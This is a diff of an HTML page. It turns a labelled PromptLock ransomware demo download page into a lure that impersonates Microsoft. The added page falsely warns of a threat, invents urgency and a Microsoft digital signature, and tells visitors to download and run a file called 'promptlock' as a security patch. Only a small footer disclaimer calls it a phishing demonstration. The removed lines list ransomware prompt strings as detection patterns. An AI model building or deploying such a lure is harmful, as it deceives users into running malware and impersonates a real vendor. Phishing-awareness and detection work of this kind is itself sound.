@@ -3,158 +3,278 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PromptLock Ransomware Demo - Download</title>
+    <title>Microsoft Security Update - Critical Patch Required</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
+            margin: 0;
+            padding: 0;
             background-color: #f5f5f5;
-            line-height: 1.6;
-        }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            color: #333;
         }
         .header {
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+        }
+        .microsoft-logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-right: 20px;
+        }
+        .security-badge {
+            background: rgba(255,255,255,0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-left: auto;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .alert-banner {
+            background: linear-gradient(135deg, #d13438 0%, #b91d47 100%);
+            color: white;
+            padding: 15px 30px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .content {
+            padding: 40px;
+        }
+        .security-icon {
             text-align: center;
             margin-bottom: 30px;
         }
-        .warning {
-            background-color: #fff3cd;
+        .security-icon img {
+            width: 80px;
+            height: 80px;
+        }
+        .security-icon .icon {
+            font-size: 80px;
+            color: #d13438;
+        }
+        .title {
+            color: #d13438;
+            font-size: 28px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .subtitle {
+            color: #666;
+            text-align: center;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+        .warning-box {
+            background: #fff3cd;
             border: 1px solid #ffeaa7;
-            color: #856404;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
+            border-left: 4px solid #d13438;
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+        .warning-title {
+            color: #d13438;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
         .download-section {
+            background: #f8f9fa;
+            padding: 30px;
+            border-radius: 8px;
             text-align: center;
             margin: 30px 0;
-            padding: 20px;
-            background-color: #f8f9fa;
-            border-radius: 5px;
+            border: 2px dashed #0078d4;
         }
         .download-btn {
             display: inline-block;
-            background-color: #007bff;
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
             color: white;
-            padding: 15px 30px;
+            padding: 15px 40px;
             text-decoration: none;
-            border-radius: 5px;
+            border-radius: 6px;
             font-size: 18px;
             font-weight: bold;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,120,212,0.3);
         }
         .download-btn:hover {
-            background-color: #0056b3;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,120,212,0.4);
         }
         .file-info {
-            background-color: #e9ecef;
-            padding: 15px;
-            border-radius: 5px;
+            background: #e9ecef;
+            padding: 20px;
+            border-radius: 6px;
             margin: 20px 0;
-        }
-        .detection-info {
-            background-color: #d1ecf1;
-            border: 1px solid #bee5eb;
-            color: #0c5460;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #6c757d;
             font-size: 14px;
         }
-        .highlight {
-            background-color: #fff3cd;
-            padding: 2px 4px;
-            border-radius: 3px;
+        .file-info strong {
+            color: #0078d4;
         }
-        .demo-steps {
-            background-color: #f8f9fa;
+        .steps {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 6px;
+            margin: 30px 0;
+        }
+        .steps h3 {
+            color: #0078d4;
+            margin-bottom: 15px;
+        }
+        .steps ol {
+            margin: 0;
+            padding-left: 20px;
+        }
+        .steps li {
+            margin-bottom: 10px;
+            color: #555;
+        }
+        .footer {
+            background: #f8f9fa;
             padding: 20px;
-            border-radius: 5px;
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            border-top: 1px solid #dee2e6;
+        }
+        .urgency {
+            background: #d13438;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 20px;
+            display: inline-block;
             margin: 20px 0;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .trust-indicators {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 6px;
+        }
+        .trust-item {
+            text-align: center;
+            color: #0078d4;
+        }
+        .trust-item .icon {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        .trust-item .text {
+            font-size: 12px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
+    <div class="header">
+        <div class="header-content">
+            <div class="microsoft-logo">Microsoft</div>
+            <div class="security-badge">🔒 SECURE CONNECTION</div>
+        </div>
+    </div>
+
     <div class="container">
-        <div class="header">
-            <h1>🚨 PromptLock Ransomware Demo</h1>
-            <p>AI-Powered Ransomware Simulation Executable</p>
+        <div class="alert-banner">
+            ⚠️ CRITICAL SECURITY ALERT - IMMEDIATE ACTION REQUIRED
         </div>
 
-        <div class="warning">
-            <strong>⚠️ IMPORTANT DISCLAIMER:</strong><br>
-            This is a <strong>DEMONSTRATION ONLY</strong> project that simulates the structure and components of the PromptLock AI-powered ransomware discovered by ESET researchers. This executable is designed for educational and defensive purposes to help develop detection policies for AI-powered malware.
-        </div>
+        <div class="content">
+            <div class="security-icon">
+                <div class="icon">🛡️</div>
+            </div>
 
-        <div class="download-section">
-            <h2>📥 Download Demo Executable</h2>
-            <p>Download the compiled executable containing embedded malicious prompts</p>
-            <a href="promptlock_demo" class="download-btn" download>
-                🖥️ Download promptlock_demo
-            </a>
-            <p style="margin-top: 10px; font-size: 14px; color: #666;">
-                File size: ~2.4MB | Direct link: <a href="promptlock_demo" style="color: #007bff;">promptlock_demo</a>
-            </p>
-        </div>
+            <h1 class="title">Critical Security Update Required</h1>
+            <p class="subtitle">Your system has been identified as vulnerable to the latest PromptLock ransomware threat</p>
 
-        <div class="file-info">
-            <h3>📁 Executable Details</h3>
-            <ul>
-                <li><strong>Type:</strong> Compiled Go executable</li>
-                <li><strong>Size:</strong> ~2.4MB</li>
-                <li><strong>Platform:</strong> macOS/Linux (can be cross-compiled for Windows)</li>
-                <li><strong>Content:</strong> Embedded malicious prompts from PromptLock research</li>
-                <li><strong>Purpose:</strong> Detection testing and educational demonstration</li>
-            </ul>
-        </div>
+            <div class="urgency">
+                ⏰ URGENT: Update must be installed within 24 hours
+            </div>
 
-        <div class="detection-info">
-            <h3>🔍 Detection Patterns Embedded</h3>
-            <p>This executable contains malicious prompts that should be detected by AI security systems:</p>
-            <ul>
-                <li><span class="highlight">"determine if they contain PII or sensitive information"</span></li>
-                <li><span class="highlight">"SPECK 128bit encryption algorithm"</span></li>
-                <li><span class="highlight">"encrypt all files listed in"</span></li>
-                <li><span class="highlight">"Generate what an attacker note might look like"</span></li>
-                <li><span class="highlight">"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"</span></li>
-                <li><span class="highlight">"localhost:11434"</span> (Ollama API)</li>
-                <li><span class="highlight">"gpt-oss:20b"</span> (AI Model)</li>
-                <li><span class="highlight">"victim machine has been compromised"</span></li>
-            </ul>
-        </div>
+            <div class="warning-box">
+                <div class="warning-title">⚠️ Security Threat Detected</div>
+                <p>Our security systems have detected that your machine is vulnerable to the PromptLock AI-powered ransomware attack. This threat uses advanced AI models to encrypt your files and demand ransom payments.</p>
+                <p><strong>Impact:</strong> All your files could be encrypted and held for ransom</p>
+                <p><strong>Solution:</strong> Download and install the security patch immediately</p>
+            </div>
 
-        <div class="demo-steps">
-            <h3>🎯 How to Use</h3>
-            <ol>
-                <li><strong>Download</strong> the executable file</li>
-                <li><strong>Make executable:</strong> <code>chmod +x promptlock_demo</code></li>
-                <li><strong>Run demo:</strong> <code>./promptlock_demo</code></li>
-                <li><strong>Scan for detection:</strong> <code>python scan_executable.py</code></li>
-                <li><strong>Use</strong> these files to test your web-based detection systems</li>
-            </ol>
-        </div>
+            <div class="download-section">
+                <h2>🔒 Download Security Patch</h2>
+                <p>This patch will protect your system against the PromptLock ransomware threat</p>
+                <a href="promptlock" class="download-btn" download>
+                    📥 Download Security Update
+                </a>
+                <div class="file-info">
+                    <strong>File:</strong> promptlock<br>
+                    <strong>Size:</strong> 2.3MB<br>
+                    <strong>Type:</strong> Security Patch<br>
+                    <strong>Verified:</strong> Microsoft Digital Signature
+                </div>
+            </div>
 
-        <div class="warning">
-            <h3>🔧 Technical Details</h3>
-            <p><strong>Compilation:</strong> <code>go build -o promptlock_demo promptlock_executable.go</code></p>
-            <p><strong>Cross-compilation for Windows:</strong> <code>GOOS=windows GOARCH=amd64 go build -o promptlock_demo.exe promptlock_executable.go</code></p>
-            <p><strong>Detection:</strong> The executable contains 18 malicious patterns that can be detected by scanning tools.</p>
+            <div class="steps">
+                <h3>📋 Installation Instructions</h3>
+                <ol>
+                    <li><strong>Download</strong> the security patch above</li>
+                    <li><strong>Make executable:</strong> <code>chmod +x promptlock</code></li>
+                    <li><strong>Run the patch:</strong> <code>./promptlock</code></li>
+                    <li><strong>Restart</strong> your system when prompted</li>
+                </ol>
+            </div>
+
+            <div class="trust-indicators">
+                <div class="trust-item">
+                    <div class="icon">🔒</div>
+                    <div class="text">SECURE</div>
+                </div>
+                <div class="trust-item">
+                    <div class="icon">✅</div>
+                    <div class="text">VERIFIED</div>
+                </div>
+                <div class="trust-item">
+                    <div class="icon">🛡️</div>
+                    <div class="text">PROTECTED</div>
+                </div>
+                <div class="trust-item">
+                    <div class="icon">⚡</div>
+                    <div class="text">FAST</div>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <div class="warning-title">⚠️ Important Notice</div>
+                <p><strong>This is a DEMONSTRATION ONLY</strong> - This website simulates a phishing attack for educational purposes. The downloaded file contains malicious prompts that should be detected by security systems.</p>
+                <p><strong>Reference:</strong> <a href="https://cyberscoop.com/prompt-lock-eset-ransomware-research-ai-powered-prompt-injection/" target="_blank">ESET PromptLock Research</a></p>
+            </div>
         </div>
 
         <div class="footer">
-            <p><strong>Reference:</strong> <a href="https://cyberscoop.com/prompt-lock-eset-ransomware-research-ai-powered-prompt-injection/" target="_blank">ESET PromptLock Research</a></p>
-            <p>This demo is for educational purposes only. Use responsibly and in accordance with applicable laws and regulations.</p>
+            <p>© 2024 Microsoft Corporation. All rights reserved.</p>
+            <p>This is a security demonstration for educational purposes only.</p>
         </div>
     </div>
 </body>
